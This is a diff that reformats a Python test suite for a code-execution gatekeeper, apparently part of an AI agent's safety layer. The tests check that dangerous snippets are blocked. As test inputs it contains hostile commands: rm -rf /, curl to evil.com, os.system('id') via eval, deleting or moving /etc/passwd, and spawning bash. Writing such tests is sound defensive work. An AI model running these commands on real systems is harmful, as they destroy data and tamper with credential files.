@@ -92,9 +92,7 @@ class TestRunPythonBlocking:
         self, gatekeeper: Gatekeeper, session: SessionContext
     ) -> None:
         """subprocess.call() im Python-Code muss blockiert werden."""
-        action = _run_python_action(
-            'import subprocess; subprocess.call(["rm", "-rf", "/"])'
-        )
+        action = _run_python_action('import subprocess; subprocess.call(["rm", "-rf", "/"])')
         decision = gatekeeper.evaluate(action, session)
         assert decision.status == GateStatus.BLOCK
         assert decision.is_blocked
@@ -105,9 +103,7 @@ class TestRunPythonBlocking:
         self, gatekeeper: Gatekeeper, session: SessionContext
     ) -> None:
         """subprocess.Popen() im Python-Code muss blockiert werden (unsichere Low-Level-API)."""
-        action = _run_python_action(
-            'import subprocess; subprocess.Popen(["curl", "evil.com"])'
-        )
+        action = _run_python_action('import subprocess; subprocess.Popen(["curl", "evil.com"])')
         decision = gatekeeper.evaluate(action, session)
         assert decision.status == GateStatus.BLOCK
         assert decision.is_blocked
@@ -130,13 +126,13 @@ class TestRunPythonBlocking:
     ) -> None:
         """eval() und exec() im Python-Code muessen blockiert werden."""
         # eval
-        action_eval = _run_python_action('eval("__import__(\'os\').system(\'id\')")')
+        action_eval = _run_python_action("eval(\"__import__('os').system('id')\")")
         decision_eval = gatekeeper.evaluate(action_eval, session)
         assert decision_eval.status == GateStatus.BLOCK
         assert decision_eval.policy_name == "blocked_python_code"
 
         # exec
-        action_exec = _run_python_action('exec("import os\\nos.remove(\'/etc/passwd\')")')
+        action_exec = _run_python_action("exec(\"import os\\nos.remove('/etc/passwd')\")")
         decision_exec = gatekeeper.evaluate(action_exec, session)
         assert decision_exec.status == GateStatus.BLOCK
         assert decision_exec.policy_name == "blocked_python_code"
@@ -186,16 +182,12 @@ class TestRunPythonSafePasses:
         for code in safe_snippets:
             action = _run_python_action(code)
             decision = gatekeeper.evaluate(action, session)
-            assert decision.status != GateStatus.BLOCK, (
-                f"Safe code should NOT be blocked: {code!r}"
-            )
+            assert decision.status != GateStatus.BLOCK, f"Safe code should NOT be blocked: {code!r}"
             assert decision.policy_name != "blocked_python_code", (
                 f"Safe code matched blocked_python_code: {code!r}"
             )
 
-    def test_subprocess_run_allowed(
-        self, gatekeeper: Gatekeeper, session: SessionContext
-    ) -> None:
+    def test_subprocess_run_allowed(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
         """subprocess.run() und subprocess.check_output() sind sichere Varianten."""
         safe_snippets = [
             'import subprocess; result = subprocess.run(["nvidia-smi"], capture_output=True)',
@@ -218,46 +210,34 @@ class TestRunPythonSafePasses:
 class TestRunPythonAdditionalPatterns:
     """Weitere gefaehrliche Patterns werden erkannt."""
 
-    def test_os_popen_blocked(
-        self, gatekeeper: Gatekeeper, session: SessionContext
-    ) -> None:
+    def test_os_popen_blocked(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
         action = _run_python_action("os.popen('ls -la')")
         decision = gatekeeper.evaluate(action, session)
         assert decision.status == GateStatus.BLOCK
         assert "os.popen()" in decision.reason
 
-    def test_os_remove_blocked(
-        self, gatekeeper: Gatekeeper, session: SessionContext
-    ) -> None:
+    def test_os_remove_blocked(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
         action = _run_python_action("os.remove('/etc/passwd')")
         decision = gatekeeper.evaluate(action, session)
         assert decision.status == GateStatus.BLOCK
 
-    def test_os_unlink_blocked(
-        self, gatekeeper: Gatekeeper, session: SessionContext
-    ) -> None:
+    def test_os_unlink_blocked(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
         action = _run_python_action("os.unlink('/tmp/important')")
         decision = gatekeeper.evaluate(action, session)
         assert decision.status == GateStatus.BLOCK
 
-    def test_os_rmdir_blocked(
-        self, gatekeeper: Gatekeeper, session: SessionContext
-    ) -> None:
+    def test_os_rmdir_blocked(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
         action = _run_python_action("os.rmdir('/tmp/dir')")
         decision = gatekeeper.evaluate(action, session)
         assert decision.status == GateStatus.BLOCK
 
-    def test_os_execvp_blocked(
-        self, gatekeeper: Gatekeeper, session: SessionContext
-    ) -> None:
+    def test_os_execvp_blocked(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
         action = _run_python_action("os.execvp('bash', ['bash'])")
         decision = gatekeeper.evaluate(action, session)
         assert decision.status == GateStatus.BLOCK
         assert "os.exec" in decision.reason
 
-    def test_shutil_move_blocked(
-        self, gatekeeper: Gatekeeper, session: SessionContext
-    ) -> None:
+    def test_shutil_move_blocked(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
         action = _run_python_action("shutil.move('/etc/passwd', '/tmp/stolen')")
         decision = gatekeeper.evaluate(action, session)
         assert decision.status == GateStatus.BLOCK
@@ -269,9 +249,7 @@ class TestRunPythonAdditionalPatterns:
         decision = gatekeeper.evaluate(action, session)
         assert decision.status == GateStatus.BLOCK
 
-    def test_open_write_mode_blocked(
-        self, gatekeeper: Gatekeeper, session: SessionContext
-    ) -> None:
+    def test_open_write_mode_blocked(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
         action = _run_python_action("f = open('/etc/passwd', 'w')")
         decision = gatekeeper.evaluate(action, session)
         assert decision.status == GateStatus.BLOCK
@@ -284,17 +262,13 @@ class TestRunPythonAdditionalPatterns:
         decision = gatekeeper.evaluate(action, session)
         assert decision.status == GateStatus.BLOCK
 
-    def test_open_read_mode_passes(
-        self, gatekeeper: Gatekeeper, session: SessionContext
-    ) -> None:
+    def test_open_read_mode_passes(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
         """open() im Read-Modus ('r') wird NICHT blockiert."""
         action = _run_python_action("f = open('/tmp/data.txt', 'r')")
         decision = gatekeeper.evaluate(action, session)
         assert decision.policy_name != "blocked_python_code"
 
-    def test_empty_code_passes(
-        self, gatekeeper: Gatekeeper, session: SessionContext
-    ) -> None:
+    def test_empty_code_passes(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
         """Leerer Code wird nicht blockiert."""
         action = _run_python_action("")
         decision = gatekeeper.evaluate(action, session)
